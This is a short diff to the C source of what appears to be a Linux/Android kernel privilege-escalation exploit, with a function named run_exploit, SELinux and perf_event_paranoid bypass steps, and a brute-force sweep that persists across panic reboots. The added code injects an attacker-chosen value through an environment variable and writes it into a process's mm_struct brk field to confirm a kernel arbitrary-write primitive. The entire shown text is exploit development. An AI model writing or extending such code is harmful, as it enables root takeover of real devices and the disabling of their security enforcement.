@@ -216,6 +216,10 @@ static void calib_fill_iovec(struct iovec *iv, int n, uint64_t base) {
 
 /* waiter word w -> carrier word (base_word + w) */
 static uint64_t overlay_word_value(int w) {
+  if (w == 2) {
+    const char *v = getenv("PVM_WRITE_VAL");
+    if (v && v[0]) return strtoull(v, NULL, 0);
+  }
   switch (w) {
     case 0:
       return pselect_custom_target - 8;
@@ -941,6 +945,20 @@ int run_exploit(int argc, char **argv) {
   if (SELINUX_ENFORCING_OFF == 0) {
     pr_info("selinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1\n");
     if (SYSCTL_PERF_EVENT_PARANOID_OFF != 0) {
+      if (env_int_range("GL_VERIFY", 0, 0, 1)) {
+        const char *vs = getenv("PVM_WRITE_VAL");
+        uint64_t magic = vs && vs[0] ? strtoull(vs, NULL, 0) : 0xCAFEB0000ULL;
+        uintptr_t vt = last_mm_struct + 0x148;
+        pr_info("VERIFY: target=%016zx (mm+brk) value=%016llx\n",
+                vt, (unsigned long long)magic);
+        do_one_write_node(vt, "VERIFY brk write", 3, 0);
+        unsigned long b = (unsigned long)syscall(SYS_brk, 0);
+        pr_info("VERIFY: brk(0)=%016lx want=%016llx -> %s\n", b,
+                (unsigned long long)magic,
+                b == magic ? "*** WRITE PRIMITIVE PROVEN ***"
+                           : "write did not land");
+        goto after_w1c;
+      }
       /* v14 gear sweep: alias = TRUE_PAGE_OFFSET + m*1GB + 0x80000 + off.
          m persists across panic reboots (.gl_round). */
       for (int att = 1; att <= 600; att++) {
@@ -966,6 +984,7 @@ int run_exploit(int argc, char **argv) {
         }
       }
     }
+    after_w1c:
     selinux_ok = 1;
   } else if (!selinux_ok && !root_child_done) {
     /* Fallback: direct PI write to selinux_enforcing */
